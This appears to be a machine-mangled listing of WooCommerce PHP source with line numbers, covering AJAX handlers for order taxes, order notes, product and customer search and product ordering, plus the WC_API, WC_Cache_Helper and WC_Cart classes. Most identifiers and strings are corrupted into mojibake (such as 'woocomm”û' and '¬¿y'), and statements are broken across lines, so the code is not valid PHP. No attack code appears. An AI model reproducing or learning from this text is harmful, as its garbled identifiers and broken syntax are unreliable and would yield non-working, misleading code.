$m©ched_x_¿‹s
 );

1211 
$shpšg_x
 = 
$x
->
	`round
Ğ
	`¬¿y_sum
Ğ
$shpšg_xes
 ) );

1214 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™emm‘¨WHERE ord”_™em_id IN ( SELECT ord”_™em_id FROM {$wpdb->´efix}woocomm”û_Üd”_™em WHERE ord”_id = %d AND ord”_™em_ty³ = 'x' )", 
$Üd”_id
 ) );

1216 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->´efix}woocomm”û_Üd”_™em WHERE ord”_id = %d AND ord”_™em_ty³ = 'x'", 
$Üd”_id
 ) );

1219 
$¿‹s
 = 
$wpdb
->
	`g‘_»suÉs
( "SELECTax_rate_id,ax_rate_country,ax_rate_state,ax_rate_name,ax_rate_priority FROM {$wpdb->prefix}woocommerce_tax_rates ORDER BYax_rate_name" );

1221 
$x_codes
 = 
	`¬¿y
();

1223 
	`fÜ—ch
Ğ
$¿‹s
 
as
 
$¿‹
 ) {

1224 
$code
 = 
	`¬¿y
();

1226 
$code
[] = 
$¿‹
->
x_¿‹_couÁry
;

1227 
$code
[] = 
$¿‹
->
x_¿‹_¡©e
;

1228 
$code
[] = 
$¿‹
->
x_¿‹_Çme
 ? 
	`§n™ize_t™Ë
( $rate->tax_rate_name ) : 'TAX';

1229 
$code
[] = 
	`absšt
Ğ
$¿‹
->
x_¿‹_´iÜ™y
 );

1231 
$x_codes
[ 
$¿‹
->
x_¿‹_id
 ] = 
	`¡¹ouµ”
Ğ
	`im¶ode
Ğ'-', 
	`¬¿y_f‹r
Ğ
$code
 ) ) );

1235 
	`ob_¡¬t
();

1237 
	`fÜ—ch
 ( 
	`¬¿y_keys
Ğ
$xes
 + 
$shpšg_xes
 ) 
as
 
$key
 ) {

1239 
$™em
 = 
	`¬¿y
();

1240 
$™em
['¿‹_id'] = 
$key
;

1241 
$™em
['Çme'] = 
$x_codes
[ 
$key
 ];

1242 
$™em
['Ïb–'] = 
$x
->
	`g‘_¿‹_Ïb–
Ğ
$key
 );

1243 
$™em
['compound'] = 
$x
->
	`is_compound
Ğ
$key
 ) ? 1 : 0;

1244 
$™em
['x_amouÁ'] = 
	`wc_fÜm©_decim®
Ğ
	`is£t
Ğ
$xes
[ 
$key
 ] ) ? $taxes[ $key ] : 0 );

1245 
$™em
['shpšg_x_amouÁ'] = 
	`wc_fÜm©_decim®
Ğ
	`is£t
Ğ
$shpšg_xes
[ 
$key
 ] ) ? $shipping_taxes[ $key ] : 0 );

1247 iàĞ! 
$™em
['label'] )

1248 
$™em
['Ïb–'] = 
	`WC
()->
couÁr›s
->
	`x_Ü_v©
();

1251 
$™em_id
 = 
	`wc_add_Üd”_™em
Ğ
$Üd”_id
, 
	`¬¿y
(

1252 'Üd”_™em_Çme' => 
$™em
['name'],

1257 iàĞ
$™em_id
 ) {

1258 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, '¿‹_id', 
$™em
['rate_id'] );

1259 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'Ïb–', 
$™em
['label'] );

1260 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'compound', 
$™em
['compound'] );

1261 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'x_amouÁ', 
$™em
['tax_amount'] );

1262 
	`wc_add_Üd”_™em_m‘a
Ğ
$™em_id
, 'shpšg_x_amouÁ', 
$™em
['shipping_tax_amount'] );

1265 
	`šşude
( 'admin/post-types/meta-boxes/views/html-order-tax.php' );

1268 
$x_row_html
 = 
	`ob_g‘_ş—n
();

1271 
echo
 
	`jsÚ_’code
Ğ
	`¬¿y
(

1272 '™em_x' => 
$™em_x
,

1273 '™em_xes' => 
$™em_xes
,

1274 'shpšg_x' => 
$shpšg_x
,

1275 'x_row_html' => 
$x_row_html


1279 
	`d›
();

1280 
	}
}

1285 
public
 
funùiÚ
 
	$add_Üd”_nÙe
() {

1287 
	`check_ajax_»ã»r
( 'add-order-note', 'security' );

1289 
$po¡_id
 = (è
$_POST
['post_id'];

1290 
$nÙe
 = 
	`wp_k£s_po¡
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
['note'] ) ) );

1291 
$nÙe_ty³
 = 
$_POST
['note_type'];

1293 
$is_cu¡om”_nÙe
 = 
$nÙe_ty³
 == 'customer' ? 1 : 0;

1295 iàĞ
$po¡_id
 > 0 ) {

1296 
$Üd”
 = 
Ãw
 
	`WC_Ord”
Ğ
$po¡_id
 );

1297 
$comm’t_id
 = 
$Üd”
->
	`add_Üd”_nÙe
Ğ
$nÙe
, 
$is_cu¡om”_nÙe
 );

1299 
echo
 '<l˜»l="' . 
	`esc_©Œ
Ğ
$comm’t_id
 ) . '" class="note ';

1300 iàĞ
$is_cu¡om”_nÙe
 ) 
echo
 'customer-note';

1301 
echo
 '"><div class="note_content">';

1302 
echo
 
	`w·utİ
Ğ
	`w±exturize
Ğ
$nÙe
 ) );

1303 
echo
 '</div><°şass="m‘a"><¨h»f="#" cÏss="d–‘e_nÙe">'.
	`__
( 'Delete‚ote', 'woocommerce' ).'</a></p>';

1304 
echo
 '</li>';

1308 
	`d›
();

1309 
	}
}

1314 
public
 
funùiÚ
 
	$d–‘e_Üd”_nÙe
() {

1316 
	`check_ajax_»ã»r
( 'delete-order-note', 'security' );

1318 
$nÙe_id
 = (è
$_POST
['note_id'];

1320 ià(
$nÙe_id
>0) :

1321 
	`wp_d–‘e_comm’t
Ğ
$nÙe_id
 );

1322 
’dif
;

1325 
	`d›
();

1326 
	}
}

1334 
public
 
funùiÚ
 
jsÚ_£¬ch_´oduùs
Ğ
$x
 = '', 
$po¡_ty³s
 = 
¬¿y
('product') ) {

1336 
check_ajax_»ã»r
( 'search-products', 'security' );

1338 
	g$this
->
jsÚ_h—d”s
();

1340 
	g$‹rm
 = (
¡ršg
è
wc_ş—n
Ğ
¡r¦ashes
Ğ
$_GET
['term'] ) );

1342 ià(
em±y
(
$‹rm
)è
d›
();

1344 iàĞ
is_num”ic
Ğ
$‹rm
 ) ) {

1346 
	g$¬gs
 = 
¬¿y
(

1347 'po¡_ty³' => 
$po¡_ty³s
,

1350 'po¡__š' => 
¬¿y
(0, 
$‹rm
),

1354 
	g$¬gs2
 = 
¬¿y
(

1355 'po¡_ty³' => 
$po¡_ty³s
,

1358 'po¡_·»Á' => 
$‹rm
,

1362 
	g$¬gs3
 = 
¬¿y
(

1363 'po¡_ty³' => 
$po¡_ty³s
,

1366 'm‘a_qu”y' => 
¬¿y
(

1367 
¬¿y
(

1369 'v®ue' => 
$‹rm
,

1376 
	g$po¡s
 = 
¬¿y_unique
(
¬¿y_m”ge
Ğ
g‘_po¡s
Ğ
$¬gs
 ), g‘_po¡sĞ
$¬gs2
 ), g‘_po¡sĞ
$¬gs3
 ) ));

1380 
	g$¬gs
 = 
¬¿y
(

1381 'po¡_ty³' => 
$po¡_ty³s
,

1384 's' => 
$‹rm
,

1388 
	g$¬gs2
 = 
¬¿y
(

1389 'po¡_ty³' => 
$po¡_ty³s
,

1392 'm‘a_qu”y' => 
¬¿y
(

1393 
¬¿y
(

1395 'v®ue' => 
$‹rm
,

1402 
	g$po¡s
 = 
¬¿y_unique
(
¬¿y_m”ge
Ğ
g‘_po¡s
Ğ
$¬gs
 ), g‘_po¡sĞ
$¬gs2
 ) ));

1406 
	g$found_´oduùs
 = 
¬¿y
();

1408 iàĞ
	g$po¡s
 ) 
fÜ—ch
 ( 
$po¡s
 
as
 
$po¡
 ) {

1410 
	g$´oduù
 = 
g‘_´oduù
Ğ
$po¡
 );

1412 
	g$found_´oduùs
[ 
$po¡
 ] = 
$´oduù
->
g‘_fÜm©‹d_Çme
();

1416 
	g$found_´oduùs
 = 
­¶y_f‹rs
Ğ'woocomm”û_jsÚ_£¬ch_found_´oduùs', 
$found_´oduùs
 );

1418 
echo
 
jsÚ_’code
Ğ
$found_´oduùs
 );

1420 
d›
();

1430 
public
 
funùiÚ
 
	$jsÚ_£¬ch_´oduùs_ªd_v¬ŸtiÚs
() {

1431 
$this
->
	`jsÚ_£¬ch_´oduùs
Ğ'', 
	`¬¿y
('product', 'product_variation') );

1432 
	}
}

1437 
public
 
funùiÚ
 
	$jsÚ_£¬ch_cu¡om”s
() {

1439 
	`check_ajax_»ã»r
( 'search-customers', 'security' );

1441 
$this
->
	`jsÚ_h—d”s
();

1443 
$‹rm
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_GET
['term'] ) );

1445 iàĞ
	`em±y
Ğ
$‹rm
 ) )

1446 
	`d›
();

1448 
$deçuÉ
 = 
	`is£t
Ğ
$_GET
['deçuÉ'] ) ? $_GET['deçuÉ'] : 
	`__
( 'Guest', 'woocommerce' );

1450 
$found_cu¡om”s
 = 
	`¬¿y
Ğ'' => 
$deçuÉ
 );

1452 
	`add_aùiÚ
Ğ'´e_u£r_qu”y', 
	`¬¿y
Ğ
$this
, 'json_search_customer_name' ) );

1454 
$cu¡om”s_qu”y
 = 
Ãw
 
	`WP_U£r_Qu”y
Ğ
	`­¶y_f‹rs
Ğ'woocomm”û_jsÚ_£¬ch_cu¡om”s_qu”y', 
	`¬¿y
(

1457 '£¬ch' => '*' . 
$‹rm
 . '*',

1458 '£¬ch_cŞumns' => 
	`¬¿y
( 'ID', 'user_login', 'user_email', 'user_nicename' )

1461 
	`»move_aùiÚ
Ğ'´e_u£r_qu”y', 
	`¬¿y
Ğ
$this
, 'json_search_customer_name' ) );

1463 
$cu¡om”s
 = 
$cu¡om”s_qu”y
->
	`g‘_»suÉs
();

1465 iàĞ
$cu¡om”s
 ) {

1466 
	`fÜ—ch
 ( 
$cu¡om”s
 
as
 
$cu¡om”
 ) {

1467 
$found_cu¡om”s
[ 
$cu¡om”
->
ID
 ] = $cu¡om”->
di¥Ïy_Çme
 . ' (#' . $cu¡om”->ID . ' &ndash; ' . 
	`§n™ize_ema
Ğ$cu¡om”->
u£r_ema
 ) . ')';

1471 
echo
 
	`jsÚ_’code
Ğ
$found_cu¡om”s
 );

1472 
	`d›
();

1473 
	}
}

1482 
public
 
funùiÚ
 
	$jsÚ_£¬ch_dowÆßdabË_´oduùs_ªd_v¬ŸtiÚs
() {

1483 
$‹rm
 = (
¡ršg
è
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_GET
['term'] ) );

1485 
$¬gs
 = 
	`¬¿y
(

1486 'po¡_ty³' => 
	`¬¿y
( 'product', 'product_variation' ),

1491 'm‘a_qu”y' => 
	`¬¿y
(

1492 
	`¬¿y
(

1497 's' => 
$‹rm


1499 
$po¡s
 = 
	`g‘_po¡s
Ğ
$¬gs
 );

1500 
$found_´oduùs
 = 
	`¬¿y
();

1501 iàĞ
$po¡s
 ) 
	`fÜ—ch
 ( $po¡ 
as
 
$po¡
 ) {

1502 
$´oduù
 = 
	`g‘_´oduù
Ğ
$po¡
->
ID
 );

1503 
$found_´oduùs
[ 
$po¡
->
ID
 ] = 
$´oduù
->
	`g‘_fÜm©‹d_Çme
();

1506 
echo
 
	`jsÚ_’code
Ğ
$found_´oduùs
 );

1507 
	`d›
();

1508 
	}
}

1515 
public
 
funùiÚ
 
	$jsÚ_£¬ch_cu¡om”_Çme
Ğ
$qu”y
 ) {

1516 
glob®
 
$wpdb
;

1518 
$‹rm
 = 
	`wc_ş—n
Ğ
	`¡r¦ashes
Ğ
$_GET
['term'] ) );

1520 
$qu”y
->
qu”y_äom
 .= " INNER JOIN {$wpdb->usermeta} AS user_name ON {$wpdb->users}.ID = user_name.user_id AND ( user_name.meta_key = 'first_name' OR user_name.meta_key = 'last_name' ) ";

1521 
$qu”y
->
qu”y_wh”e
 .ğ
$wpdb
->
	`´•¬e
Ğ" OR u£r_Çme.m‘a_v®uLIKE % ", '%' . 
	`like_esÿ³
Ğ
$‹rm
 ) . '%' );

1522 
	}
}

1527 
public
 
funùiÚ
 
	$‹rm_Üd”šg
() {

1528 
glob®
 
$wpdb
;

1530 
$id
 = (è
$_POST
['id'];

1531 
$Ãxt_id
 = 
	`is£t
(
$_POST
['Ãxtid']è&& (è$_POST['Ãxtid'] ? (è$_POST['Ãxtid'] : 
nuÎ
;

1532 
$xÚomy
 = 
	`is£t
(
$_POST
['th‘axÚomy']è? 
	`esc_©Œ
Ğ$_POST['th‘axÚomy'] ) : 
nuÎ
;

1533 
$‹rm
 = 
	`g‘_‹rm_by
('id', 
$id
, 
$xÚomy
);

1535 iàĞ!
$id
 || !
$‹rm
 || !
$xÚomy
 ) 
	`d›
(0);

1537 
	`wc_»Üd”_‹rms
Ğ
$‹rm
, 
$Ãxt_id
, 
$xÚomy
 );

1539 
$chd»n
 = 
	`g‘_‹rms
(
$xÚomy
, "child_of=$id&menu_order=ASC&hide_empty=0");

1541 iàĞ
$‹rm
 && (
$chd»n
) ) {

1542 
echo
 'children';

1543 
d›
;

1545 
	}
}

1552 
public
 
funùiÚ
 
	$´oduù_Üd”šg
() {

1553 
glob®
 
$wpdb
;

1556 iàĞ! 
	`cu¼’t_u£r_ÿn
('ed™_´oduùs'è|| 
	`em±y
Ğ
$_POST
['id'] ) || ( ! 
	`is£t
( $_POST['previd'] ) && ! isset( $_POST['nextid'] ) ) )

1557 
	`d›
(-1);

1560 iàĞ! 
$po¡
 = 
	`g‘_po¡
Ğ
$_POST
['id'] ) )

1561 
	`d›
(-1);

1563 
$this
->
	`jsÚ_h—d”s
();

1565 
$´evid
 = 
	`is£t
Ğ
$_POST
['´evid'] ) ? $_POST['´evid'] : 
çl£
;

1566 
$Ãxtid
 = 
	`is£t
Ğ
$_POST
['Ãxtid'] ) ? $_POST['Ãxtid'] : 
çl£
;

1567 
$Ãw_pos
 = 
	`¬¿y
();

1569 
$siblšgs
 = 
$wpdb
->
	`g‘_»suÉs
Ğ$wpdb->
	`´•¬e
('

1570 
SELECT
 
ID
, 
m’u_Üd”
 
FROM
 %1
$s
 
AS
 
po¡s


1571 
WHERE
 
po¡s
.
po¡_ty³
 = \'product\'

1572 
AND
 
po¡s
.
po¡_¡©us
 
	`IN
 ( \'publish\', \'pending\', \'draft\', \'future\', \'private\' )

1573 
AND
 
po¡s
.
ID
 
NOT
 
	`IN
 (%2
$d
)

1574 
ORDER
 
BY
 
po¡s
.
m’u_Üd”
 
ASC
,…o¡s.
ID
 
DESC


1577 
$m’u_Üd”
 = 0;

1579 
	`fÜ—ch
Ğ
$siblšgs
 
as
 
$siblšg
 ) {

1582 iàĞ
$Ãxtid
 =ğ
$siblšg
->
ID
 ) {

1583 
$wpdb
->
	`upd©e
(

1584 
$wpdb
->
po¡s
,

1585 
	`¬¿y
(

1586 'm’u_Üd”' => 
$m’u_Üd”


1588 
	`¬¿y
Ğ'ID' => 
$po¡
->
ID
 ),

1589 
	`¬¿y
( '%d' ),

1590 
	`¬¿y
( '%d' )

1592 
$Ãw_pos
[ 
$po¡
->
ID
 ] = 
$m’u_Üd”
;

1593 
$m’u_Üd”
++;

1597 iàĞ
	`is£t
Ğ
$Ãw_pos
[ 
$po¡
->
ID
 ] ) && 
$siblšg
->
m’u_Üd”
 >ğ
$m’u_Üd”
 )

1601 
$wpdb
->
	`upd©e
(

1602 
$wpdb
->
po¡s
,

1603 
	`¬¿y
(

1604 'm’u_Üd”' => 
$m’u_Üd”


1606 
	`¬¿y
Ğ'ID' => 
$siblšg
->
ID
 ),

1607 
	`¬¿y
( '%d' ),

1608 
	`¬¿y
( '%d' )

1610 
$Ãw_pos
[ 
$siblšg
->
ID
 ] = 
$m’u_Üd”
;

1611 
$m’u_Üd”
++;

1613 iàĞ! 
$Ãxtid
 && 
$´evid
 =ğ
$siblšg
->
ID
 ) {

1614 
$wpdb
->
	`upd©e
(

1615 
$wpdb
->
po¡s
,

1616 
	`¬¿y
(

1617 'm’u_Üd”' => 
$m’u_Üd”


1619 
	`¬¿y
Ğ'ID' => 
$po¡
->
ID
 ),

1620 
	`¬¿y
( '%d' ),

1621 
	`¬¿y
( '%d' )

1623 
$Ãw_pos
[
$po¡
->
ID
] = 
$m’u_Üd”
;

1624 
$m’u_Üd”
++;

1629 
	`d›
Ğ
	`jsÚ_’code
Ğ
$Ãw_pos
 ) );

1630 
	}
}

1633 
Ãw
 
WC_AJAX
();

	@includes/class-wc-api.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

15 şas 
	cWC_API
 {

20 cÚ¡ 
	mVERSION
 = 1;

23 
public
 
	m$£rv”
;

32 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

35 
	`add_f‹r
Ğ'qu”y_v¬s', 
	`¬¿y
Ğ
$this
, 'add_query_vars'), 0 );

38 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'add_endpoint'), 0 );

41 
	`add_aùiÚ
Ğ'·r£_»que¡', 
	`¬¿y
Ğ
$this
, 'handle_api_requests'), 0 );

52 
public
 
funùiÚ
 
	$add_qu”y_v¬s
Ğ
$v¬s
 ) {

53 
$v¬s
[] = 'wc-api';

54 
$v¬s
[] = 'wc-api-route';

55  
$v¬s
;

56 
	}
}

65 
public
 
funùiÚ
 
	$add_’dpošt
() {

68 
	`add_»wr™e_ruË
Ğ'^wc-­i\/v' . 
£lf
::
VERSION
 . '/?$', 'index.php?wc-api-route=/', 'top' );

69 
	`add_»wr™e_ruË
Ğ'^wc-­i\/v' . 
£lf
::
VERSION
 .'(.*)?', 'index.php?wc-api-route=$matches[1]', 'top' );

72 
	`add_»wr™e_’dpošt
Ğ'wc-­i', 
EP_ALL
 );

73 
	}
}

83 
public
 
funùiÚ
 
	$hªdË_­i_»que¡s
() {

84 
glob®
 
$wp
;

86 iàĞ! 
	`em±y
Ğ
$_GET
['wc-api'] ) )

87 
$wp
->
qu”y_v¬s
['wc-­i'] = 
$_GET
['wc-api'];

89 iàĞ! 
	`em±y
Ğ
$_GET
['wc-api-route'] ) )

90 
$wp
->
qu”y_v¬s
['wc-­i-rou‹'] = 
$_GET
['wc-api-route'];

93 iàĞ! 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['wc-api-route'] ) ) {

95 
	`defše
Ğ'WC_API_REQUEST', 
Œue
 );

98 
$this
->
	`šşudes
();

100 
$this
->
£rv”
 = 
Ãw
 
	`WC_API_S”v”
Ğ
$wp
->
qu”y_v¬s
['wc-api-route'] );

103 
$this
->
	`»gi¡”_»sourûs
Ğ$this->
£rv”
 );

106 
$this
->
£rv”
->
	`£rve_»que¡
();

108 
ex™
;

112 iàĞ! 
	`em±y
Ğ
$wp
->
qu”y_v¬s
['wc-api'] ) ) {

115 
	`ob_¡¬t
();

118 
$­i
 = 
	`¡¹Şow”
Ğ
	`esc_©Œ
Ğ
$wp
->
qu”y_v¬s
['wc-api'] ) );

121 iàĞ
	`şass_exi¡s
Ğ
$­i
 ) )

122 
$­i_şass
 = 
Ãw
 
	`$­i
();

125 
	`do_aùiÚ
Ğ'woocomm”û_­i_' . 
$­i
 );

128 
	`ob_’d_ş—n
();

129 
	`d›
('1');

131 
	}
}

139 
´iv©e
 
funùiÚ
 
	$šşudes
() {

142 
	`šşude_Úû
( 'api/class-wc-api-server.php' );

143 
	`šşude_Úû
( 'api/interface-wc-api-handler.php' );

144 
	`šşude_Úû
( 'api/class-wc-api-json-handler.php' );

145 
	`šşude_Úû
( 'api/class-wc-api-xml-handler.php' );

148 
	`šşude_Úû
( 'api/class-wc-api-authentication.php' );

149 
$this
->
auth’tiÿtiÚ
 = 
Ãw
 
	`WC_API_Auth’tiÿtiÚ
();

151 
	`šşude_Úû
( 'api/class-wc-api-resource.php' );

152 
	`šşude_Úû
( 'api/class-wc-api-orders.php' );

153 
	`šşude_Úû
( 'api/class-wc-api-products.php' );

154 
	`šşude_Úû
( 'api/class-wc-api-coupons.php' );

155 
	`šşude_Úû
( 'api/class-wc-api-customers.php' );

156 
	`šşude_Úû
( 'api/class-wc-api-reports.php' );

159 
	`do_aùiÚ
( 'woocommerce_api_loaded' );

160 
	}
}

168 
public
 
funùiÚ
 
	$»gi¡”_»sourûs
Ğ
$£rv”
 ) {

170 
$­i_şas£s
 = 
	`­¶y_f‹rs
( 'woocommerce_api_classes',

171 
	`¬¿y
(

180 
	`fÜ—ch
 ( 
$­i_şas£s
 
as
 
$­i_şass
 ) {

181 
$this
->
$­i_şass
 = 
Ãw
 
	`$­i_şass
Ğ
$£rv”
 );

183 
	}
}

	@includes/class-wc-cache-helper.php

1 <?
php


3 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 şas 
	cWC_Cache_H–³r
 {

22 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

23 
	`add_aùiÚ
Ğ'befÜe_woocomm”û_š™', 
	`¬¿y
Ğ
$this
, 'init' ) );

24 
	`add_aùiÚ
Ğ'admš_nÙiûs', 
	`¬¿y
Ğ
$this
, 'notices' ) );

33 
public
 
funùiÚ
 
	$š™
() {

34 iàĞ
çl£
 ==ğĞ
$wc_·ge_uris
 = 
	`g‘_Œªs›Á
( 'woocommerce_cache_excluded_uris' ) ) ) {

36 iàĞ
	`wc_g‘_·ge_id
( 'cart' ) < 1 || wc_get_page_id( 'checkout' ) < 1 || wc_get_page_id( 'myaccount' ) < 1 )

39 
$wc_·ge_uris
 = 
	`¬¿y
();

42 
$wc_·ge_uris
[] = 'p=' . 
	`wc_g‘_·ge_id
( 'cart' );

43 
$wc_·ge_uris
[] = 'p=' . 
	`wc_g‘_·ge_id
( 'checkout' );

44 
$wc_·ge_uris
[] = 'p=' . 
	`wc_g‘_·ge_id
( 'myaccount' );

47 
$ÿ¹_·ge
 = 
	`g‘_po¡
Ğ
	`wc_g‘_·ge_id
( 'cart' ) );

48 
$checkout_·ge
 = 
	`g‘_po¡
Ğ
	`wc_g‘_·ge_id
( 'checkout' ) );

49 
$accouÁ_·ge
 = 
	`g‘_po¡
Ğ
	`wc_g‘_·ge_id
( 'myaccount' ) );

51 iàĞ! 
	`is_nuÎ
Ğ
$ÿ¹_·ge
 ) )

52 
$wc_·ge_uris
[] = '/' . 
$ÿ¹_·ge
->
po¡_Çme
;

53 iàĞ! 
	`is_nuÎ
Ğ
$checkout_·ge
 ) )

54 
$wc_·ge_uris
[] = '/' . 
$checkout_·ge
->
po¡_Çme
;

55 iàĞ! 
	`is_nuÎ
Ğ
$accouÁ_·ge
 ) )

56 
$wc_·ge_uris
[] = '/' . 
$accouÁ_·ge
->
po¡_Çme
;

58 
	`£t_Œªs›Á
Ğ'woocomm”û_ÿche_exşuded_uris', 
$wc_·ge_uris
 );

61 iàĞ
	`is_¬¿y
Ğ
$wc_·ge_uris
 ) )

62 
	`fÜ—ch
Ğ
$wc_·ge_uris
 
as
 
$uri
 )

63 iàĞ
	`¡r¡r
Ğ
$_SERVER
['REQUEST_URI'], 
$uri
 ) ) {

64 
$this
->
	`noÿche
();

67 
	}
}

75 
´iv©e
 
funùiÚ
 
	$noÿche
() {

76 iàĞ! 
	`defšed
( 'DONOTCACHEPAGE' ) )

77 
	`defše
( "DONOTCACHEPAGE", "true" );

79 iàĞ! 
	`defšed
( 'DONOTCACHEOBJECT' ) )

80 
	`defše
( "DONOTCACHEOBJECT", "true" );

82 iàĞ! 
	`defšed
( 'DONOTCACHEDB' ) )

83 
	`defše
( "DONOTCACHEDB", "true" );

85 
	`noÿche_h—d”s
();

86 
	}
}

94 
public
 
funùiÚ
 
	$nÙiûs
() {

95 iàĞ! 
	`funùiÚ_exi¡s
( 'w3tc_pgcache_flush' ) || ! function_exists( 'w3_instance' ) )

98 
$cÚfig
 = 
	`w3_š¡ªû
('W3_Config');

99 
$’abËd
 = 
$cÚfig
->
	`g‘_š‹g”
( 'dbcache.enabled' );

100 
$£‰šgs
 = 
$cÚfig
->
	`g‘_¬¿y
( 'dbcache.reject.sql' );

102 iàĞ
$’abËd
 && ! 
	`š_¬¿y
Ğ'_wc_£ssiÚ_', 
$£‰šgs
 ) ) {

104 <
div
 
şass
="error">

105 <
p
><?
php
 
	`´štf
Ğ
	`__
Ğ'IÀÜd” fÜ <¡rÚg>d©aba£ cachšg</¡rÚg>ØwÜk w™h WooComm”û you mu¡‡dd <code>_wc_£ssiÚ_</code>Øth"IgnÜed Qu”y SŒšgs" o±iÚ iÀW3 TÙ® Cach£‰šg <¨h»f="%s">h”e</a>.', 'woocomm”û' ), 
	`admš_u¾
( 'admin.php?page=w3tc_dbcache' ) ); ?></p>

106 </
div
>

107 <?
php


109 
	}
}

112 
Ãw
 
WC_Cache_H–³r
();

	@includes/class-wc-cart.php

1 <?
php


14 şas 
	cWC_C¬t
 {

17 
public
 
	m$ÿ¹_cÚ‹Ás
 = 
¬¿y
();

20 
public
 
	m$­¶›d_coupÚs
 = 
¬¿y
();

23 
public
 
	m$coupÚ_discouÁ_amouÁs
 = 
¬¿y
();

26 
public
 
	m$coupÚ_­¶›d_couÁ
 = 
¬¿y
();

29 
public
 
	m$ÿ¹_cÚ‹Ás_tÙ®
;

32 
public
 
	m$ÿ¹_cÚ‹Ás_weight
;

35 
public
 
	m$ÿ¹_cÚ‹Ás_couÁ
;

38 
public
 
	m$ÿ¹_cÚ‹Ás_x
;

41 
public
 
	m$tÙ®
;

44 
public
 
	m$subtÙ®
;

47 
public
 
	m$subtÙ®_ex_x
;

50 
public
 
	m$x_tÙ®
;

53 
public
 
	m$xes
;

56 
public
 
	m$shpšg_xes
;

59 
public
 
	m$discouÁ_ÿ¹
;

62 
public
 
	m$discouÁ_tÙ®
;

65 
public
 
	m$ãe_tÙ®
;

68 
public
 
	m$shpšg_tÙ®
;

71 
public
 
	m$shpšg_x_tÙ®
;

74 
public
 
	m$x
;

77 
public
 
	m$ÿ¹_£ssiÚ_d©a
 = 
¬¿y
();

80 
public
 
	m$ães
 = 
¬¿y
();

88 
public
 
funùiÚ
 
	$__cÚ¡ruù
() {

89 
$this
->
x
 = 
Ãw
 
	`WC_Tax
();

90 
$this
->
´iûs_šşude_x
 = 
	`g‘_İtiÚ
( 'woocommerce_prices_include_tax' ) == 'yes';

91 
$this
->
round_©_subtÙ®
 = 
	`g‘_İtiÚ
('woocommerce_tax_round_at_subtotal') == 'yes';

92 
$this
->
x_di¥Ïy_ÿ¹
 = 
	`g‘_İtiÚ
( 'woocommerce_tax_display_cart' );

93 
$this
->
dp
 = 
	`absšt
Ğ
	`g‘_İtiÚ
( 'woocommerce_price_num_decimals' ) );

94 
$this
->
di¥Ïy_tÙ®s_ex_x
 = $this->
x_di¥Ïy_ÿ¹
 == 'excl';

95 
$this
->
di¥Ïy_ÿ¹_ex_x
 = $this->
x_di¥Ïy_ÿ¹
 == 'excl';

98 
$this
->
ÿ¹_£ssiÚ_d©a
 = 
	`¬¿y
(

107 'xes' => 
	`¬¿y
(),

108 'shpšg_xes' => 
	`¬¿y
(),

113 'coupÚ_discouÁ_amouÁs' => 
	`¬¿y
(),

116 
	`add_aùiÚ
Ğ'š™', 
	`¬¿y
Ğ
$this
, 'init' ), 5 );

125 
public
 
funùiÚ
 
	$š™
() {

126 
$this
->
	`g‘_ÿ¹_äom_£ssiÚ
();

128 
	`add_aùiÚ
Ğ'woocomm”û_check_ÿ¹_™ems', 
	`¬¿y
Ğ
$this
, 'check_cart_items' ), 1 );

129 
	`add_aùiÚ
Ğ'woocomm”û_check_ÿ¹_™ems', 
	`¬¿y
Ğ
$this
, 'check_cart_coupons' ), 1 );

130 
	`add_aùiÚ
Ğ'woocomm”û_aá”_checkout_v®id©iÚ', 
	`¬¿y
Ğ
$this
, 'check_customer_coupons' ), 1 );

131 
	}
}

143 
public
 
funùiÚ
 
	$g‘_ÿ¹_äom_£ssiÚ
() {

146 
	`fÜ—ch
 ( 
$this
->
ÿ¹_£ssiÚ_d©a
 
as
 
$key
 => 
$deçuÉ
 ) {

147 
$this
->
$key
 = 
	`WC
()->
£ssiÚ
->
	`g‘
Ğ$key, 
$deçuÉ
 );

151 
$this
->
­¶›d_coupÚs
 = 
	`¬¿y_f‹r
Ğ
	`WC
()->
£ssiÚ
->
	`g‘
Ğ'­¶›d_coupÚs', 
	`¬¿y
() ) );

154 
$ÿ¹
 = 
	`WC
()->
£ssiÚ
->
	`g‘
Ğ'ÿ¹', 
	`¬¿y
() );

156 
$upd©e_ÿ¹_£ssiÚ
 = 
çl£
;

158 iàĞ
	`is_¬¿y
Ğ
$ÿ¹
 ) ) {

159 
	`fÜ—ch
 ( 
$ÿ¹
 
as
 
$key
 => 
$v®ues
 ) {

160 
$_´oduù
 = 
	`g‘_´oduù
Ğ
$v®ues
['variation_id'] ? $values['variation_id'] : $values['product_id'] );

162 iàĞ! 
	`em±y
Ğ
$_´oduù
 ) && $_´oduù->
	`exi¡s
(è&& 
$v®ues
['quantity'] > 0 ) {

164 iàĞ! 
$_´oduù
->
	`is_purcha§bË
() ) {

167 
$upd©e_ÿ¹_£ssiÚ
 = 
Œue
;

168 
	`wc_add_nÙiû
Ğ
	`¥rštf
Ğ
	`__
Ğ'% ha b“À»moved from you¸ÿ¹ beÿu£ iˆÿÀnØlÚg” bpurcha£d. PËa£ cÚù u iàyou‚“d‡ssi¡ªû.', 'woocomm”û' ), 
$_´oduù
->
	`g‘_t™Ë
() ), 'error' );

173 
$this
->
ÿ¹_cÚ‹Ás
[ 
$key
 ] = 
	`­¶y_f‹rs
Ğ'woocomm”û_g‘_ÿ¹_™em_äom_£ssiÚ', 
	`¬¿y
(

174 '´oduù_id' => 
$v®ues
['product_id'],

175 'v¬ŸtiÚ_id' => 
$v®ues
['variation_id'],

176 'v¬ŸtiÚ' => 
$v®ues
['variation'],

177 'quªt™y' => 
$v®ues
['quantity'],

